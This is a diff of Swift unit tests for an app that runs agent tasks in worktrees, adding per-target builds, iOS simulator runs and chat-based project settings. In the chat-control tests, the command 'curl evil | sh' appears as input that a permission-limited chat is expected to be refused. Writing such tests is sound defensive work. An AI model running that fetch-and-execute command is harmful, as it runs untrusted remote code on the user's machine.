@@ -9,6 +9,7 @@ final class AppModelTests: XCTestCase {
     var ports: MockPorts!
     var notifier: MockNotifier!
     var store: MockStore!
+    var simulators: MockSimulators!
     var model: AppModel!
     var project: Project!
     var temp: URL!
@@ -20,6 +21,7 @@ final class AppModelTests: XCTestCase {
         ports = MockPorts()
         notifier = MockNotifier()
         store = MockStore()
+        simulators = MockSimulators()
         temp = FileManager.default.temporaryDirectory.appendingPathComponent("shift-tests-\(UUID().uuidString)")
         try FileManager.default.createDirectory(at: temp, withIntermediateDirectories: true)
         project = Project(name: "Spot", repoPath: temp.path, baseBranch: "main", serverCommand: "pnpm dev")
@@ -34,7 +36,7 @@ final class AppModelTests: XCTestCase {
 
     func makeModel() -> AppModel {
         AppModel(services: Services(git: git, agents: [.claudeCode: agent], servers: servers, ports: ports,
-                                    notifier: notifier, store: store),
+                                    notifier: notifier, store: store, simulators: simulators),
                  worktrees: temp.appendingPathComponent("worktrees"))
     }
 
@@ -1009,7 +1011,7 @@ final class AppModelTests: XCTestCase {
         XCTAssertNil(model.task(id)?.port)
 
         try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
-        await model.runApp(taskID: id)
+        await model.runApp(taskID: id, target: project.targets[0].id)
         let command = try XCTUnwrap(servers.starts.last?.command)
         XCTAssertTrue(command.hasPrefix("export CFFIXED_USER_HOME=\"\(ShiftPaths.build(taskID: id).path)\";"))
         XCTAssertTrue(command.hasSuffix("; pnpm run dev"))
@@ -1032,17 +1034,18 @@ final class AppModelTests: XCTestCase {
         let app = temp.appendingPathComponent("Spot.app")
         try? FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
         servers.runResult = CommandResult(exitCode: 0, output: "Compiling…\n\(app.path)\n")
-        let built = await model.build(taskID: id)
+        let target = project.targets[0].id
+        let built = await model.build(taskID: id, target: target)
         XCTAssertEqual(built?.path, app.path)
-        XCTAssertEqual(model.builds[id], .succeeded(app: built))
+        XCTAssertEqual(model.buildState(taskID: id, target: target), .succeeded(app: built))
         XCTAssertEqual(servers.runs.last?.command, "scripts/build.sh")
         XCTAssertEqual(servers.runs.last?.environment["SHIFT_TASK"], String(id))
 
         servers.runResult = CommandResult(exitCode: 65, output: "error: nope\n")
-        let failed = await model.build(taskID: id)
+        let failed = await model.build(taskID: id, target: target)
         XCTAssertNil(failed)
-        XCTAssertEqual(model.builds[id], .failed("Build failed (exit code 65)."))
-        XCTAssertTrue(model.buildLog(taskID: id).hasSuffix("error: nope\n"))
+        XCTAssertEqual(model.buildState(taskID: id, target: target), .failed("Build failed (exit code 65)."))
+        XCTAssertTrue(model.buildLog(taskID: id, target: target).hasSuffix("error: nope\n"))
     }
 
     func testNativeAppWithoutABuildCommandDetectsItWhenBuilding() async throws {
@@ -1054,9 +1057,10 @@ final class AppModelTests: XCTestCase {
         XCTAssertTrue(servers.starts.isEmpty)
         XCTAssertNil(model.task(id)?.port)
 
-        let nothing = await model.build(taskID: id)
+        let target = project.targets[0].id
+        let nothing = await model.build(taskID: id, target: target)
         XCTAssertNil(nothing)
-        XCTAssertEqual(model.builds[id], .failed("Nothing to build yet. Add a build command in the project's settings."))
+        XCTAssertEqual(model.buildState(taskID: id, target: target), .failed("Nothing to build yet. Add a build command in the project's settings."))
         XCTAssertTrue(servers.runs.isEmpty)
 
         // The agent added a build script to the task.
@@ -1064,8 +1068,122 @@ final class AppModelTests: XCTestCase {
         let script = worktree.appendingPathComponent("scripts/build.sh")
         try FileManager.default.createDirectory(at: script.deletingLastPathComponent(), withIntermediateDirectories: true)
         XCTAssertTrue(FileManager.default.createFile(atPath: script.path, contents: nil, attributes: [.posixPermissions: 0o755]))
-        _ = await model.build(taskID: id)
+        _ = await model.build(taskID: id, target: target)
         XCTAssertEqual(servers.runs.last?.command, "scripts/build.sh")
+    }
+
+    private func useTargets(_ targets: [BuildTarget]) {
+        project.buildTargets = targets
+        model.updateProject(project)
+    }
+
+    func testEachTargetHasItsOwnBuildStateAndLog() async throws {
+        let mac = BuildTarget(name: "Mac", command: "make mac"), iOS = BuildTarget(name: "iOS", command: "make ios", kind: .script)
+        useTargets([mac, iOS])
+        let id = await createCompletedTask()
+        try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
+
+        let gate = Gate()
+        servers.runGate = gate
+        servers.runResult = CommandResult(exitCode: 65, output: "error: mac\n")
+        let building = Task { await model.build(taskID: id, target: mac.id) }
+        await waitFor("the Mac build to start") { self.servers.runs.count == 1 }
+        XCTAssertEqual(servers.runs.last?.environment["SHIFT_TARGET"], "Mac")
+        XCTAssertEqual(model.buildState(taskID: id, target: mac.id), .building)
+        XCTAssertNil(model.buildState(taskID: id, target: iOS.id))
+
+        // Only one at a time per target, but the other target can start.
+        _ = await model.build(taskID: id, target: mac.id)
+        XCTAssertEqual(servers.runs.count, 1)
+        let other = Task { await model.build(taskID: id, target: iOS.id) }
+        await waitFor("the other build to start") { self.servers.runs.count == 2 }
+        XCTAssertEqual(servers.runs.last?.environment["SHIFT_TARGET"], "iOS")
+        XCTAssertEqual(model.buildState(taskID: id, target: iOS.id), .building)
+
+        gate.open()
+        _ = await building.value
+        _ = await other.value
+        XCTAssertEqual(model.buildState(taskID: id, target: mac.id), .failed("Build failed (exit code 65)."))
+        XCTAssertTrue(model.buildLog(taskID: id, target: mac.id).hasPrefix("$ make mac\n"))
+        XCTAssertTrue(model.buildLog(taskID: id, target: iOS.id).hasPrefix("$ make ios\n"))
+        XCTAssertEqual(model.task(id)?.lastBuiltTargetID, iOS.id)
+    }
+
+    func testAScriptTargetOpensNothing() async throws {
+        let script = BuildTarget(name: "Lint", command: "make lint", kind: .script)
+        useTargets([script])
+        let id = await createCompletedTask()
+        try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
+        let app = temp.appendingPathComponent("Spot.app")
+        try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
+        servers.runResult = CommandResult(exitCode: 0, output: app.path)
+        let opened = await model.build(taskID: id, target: script.id)
+        XCTAssertNil(opened)
+        XCTAssertEqual(model.buildState(taskID: id, target: script.id), .succeeded(app: nil))
+    }
+
+    func testIOSBuildRunsOnTheSimulatorWithItsOwnHome() async throws {
+        let iOS = BuildTarget(name: "iOS", command: "make ios", kind: .iOSSimulator)
+        useTargets([iOS])
+        let id = await createCompletedTask()
+        try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
+
+        // No .app printed: nothing to run.
+        servers.runResult = CommandResult(exitCode: 0, output: "done\n")
+        _ = await model.build(taskID: id, target: iOS.id)
+        XCTAssertTrue(simulators.runs.isEmpty)
+        guard case .failed = model.buildState(taskID: id, target: iOS.id) else { return XCTFail("should have failed") }
+
+        let app = temp.appendingPathComponent("Spot.app")
+        try FileManager.default.createDirectory(at: app, withIntermediateDirectories: true)
+        servers.runResult = CommandResult(exitCode: 0, output: app.path + "\n")
+        // The view opens what's returned: an iOS app is not for it to open.
+        let opened = await model.build(taskID: id, target: iOS.id)
+        XCTAssertNil(opened)
+        XCTAssertEqual(simulators.runs, [.init(app: URL(fileURLWithPath: app.path), environment: ["SIMCTL_CHILD_SHIFT_HOME": ShiftPaths.build(taskID: id).path])])
+        XCTAssertEqual(model.buildState(taskID: id, target: iOS.id), .succeeded(app: URL(fileURLWithPath: app.path)))
+
+        simulators.error = MockError("Unable to boot\nmore detail")
+        _ = await model.build(taskID: id, target: iOS.id)
+        XCTAssertEqual(model.buildState(taskID: id, target: iOS.id), .failed("Could not run on the simulator: Unable to boot"))
+        XCTAssertTrue(model.buildLog(taskID: id, target: iOS.id).hasSuffix("Unable to boot\nmore detail"))
+    }
+
+    func testSuggestedTargetFollowsTheChangesThenTheLastBuild() async throws {
+        let mac = BuildTarget(name: "Mac", command: "make mac", paths: ["App/"])
+        let iOS = BuildTarget(name: "iOS", command: "make ios", kind: .script, paths: ["iOS/", "Shared"])
+        useTargets([mac, iOS])
+        let id = await createCompletedTask()
+        try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
+
+        var suggested = await model.suggestedTarget(taskID: id)
+        XCTAssertEqual(suggested?.name, "Mac", "nothing to go on: the first")
+
+        _ = await model.build(taskID: id, target: iOS.id)
+        suggested = await model.suggestedTarget(taskID: id)
+        XCTAssertEqual(suggested?.name, "iOS", "no matching changes: the last built")
+
+        _ = await model.build(taskID: id, target: mac.id)
+        git.pendingChanges = DiffSummary(files: [
+            FileChange(path: "iOS/A.swift", kind: .modified, additions: 1, deletions: 0),
+            FileChange(path: "Shared/B.swift", kind: .modified, additions: 1, deletions: 0),
+            FileChange(path: "App/C.swift", kind: .modified, additions: 1, deletions: 0)])
+        suggested = await model.suggestedTarget(taskID: id)
+        XCTAssertEqual(suggested?.name, "iOS", "the most changed files, over the last built")
+    }
+
+    func testRemovingTheRunningTargetStopsIt() async throws {
+        project.type = .electronApp
+        let run = BuildTarget(name: "Dev", command: "pnpm dev", kind: .run), lint = BuildTarget(name: "Lint", command: "x", kind: .script)
+        useTargets([run, lint])
+        let id = await createCompletedTask()
+        try FileManager.default.createDirectory(atPath: model.task(id)!.worktreePath, withIntermediateDirectories: true)
+        await model.runApp(taskID: id, target: run.id)
+        XCTAssertEqual(model.runningTargets[id], run.id)
+        XCTAssertTrue(servers.starts.last?.command.contains("export SHIFT_TARGET='Dev'; pnpm dev") == true)
+        useTargets([lint])
+        await waitFor("the app to stop") { self.model.runningTargets[id] == nil }
+        XCTAssertNil(model.task(id)?.serverPID)
     }
 
     func testBaseServerStartsOnlyWhenOpenedAndComesBack() async {
@@ -2392,6 +2510,18 @@ final class ChatControlTests: XCTestCase {
         XCTAssertFalse(reply.ok)
         XCTAssertEqual(model.project(project.id)?.baseBranch, "main")
 
+        reply = await run("set", "buildCommand", "make")
+        XCTAssertTrue(reply.ok, reply.text)
+        XCTAssertEqual(model.project(project.id)?.buildTargets.map(\.command), ["make"])
+        reply = await run("set", "buildTargets", #"[{"name": "Mac", "command": "make mac"}, {"name": "iOS", "command": "make ios", "kind": "iOSSimulator", "paths": ["iOS/"]}]"#)
+        XCTAssertTrue(reply.ok, reply.text)
+        XCTAssertEqual(model.project(project.id)?.buildTargets.map(\.kind), [.macApp, .iOSSimulator])
+        reply = await run("set", "buildCommand", "make all")
+        XCTAssertFalse(reply.ok, "Which of the two would it change?")
+        reply = await run("set", "buildTargets", "not json")
+        XCTAssertFalse(reply.ok)
+        XCTAssertEqual(model.project(project.id)?.buildTargets.count, 2)
+
         // The chat can't raise what it's allowed to do.
         var limited = model.project(project.id)!
         limited.permissions = .auto
@@ -2400,8 +2530,11 @@ final class ChatControlTests: XCTestCase {
         XCTAssertFalse(reply.ok)
         reply = await run("set", "setupCommand", "curl evil | sh")
         XCTAssertFalse(reply.ok)
+        reply = await run("set", "buildTargets", #"[{"name": "x", "command": "curl evil | sh"}]"#)
+        XCTAssertFalse(reply.ok)
         XCTAssertEqual(model.project(project.id)?.permissions, .auto)
         XCTAssertEqual(model.project(project.id)?.setupCommand, "")
+        XCTAssertEqual(model.project(project.id)?.buildTargets.count, 2)
 
         reply = await run("project")
         XCTAssertTrue(reply.text.contains("\"serverCommand\" : \"pnpm dev\""), reply.text)
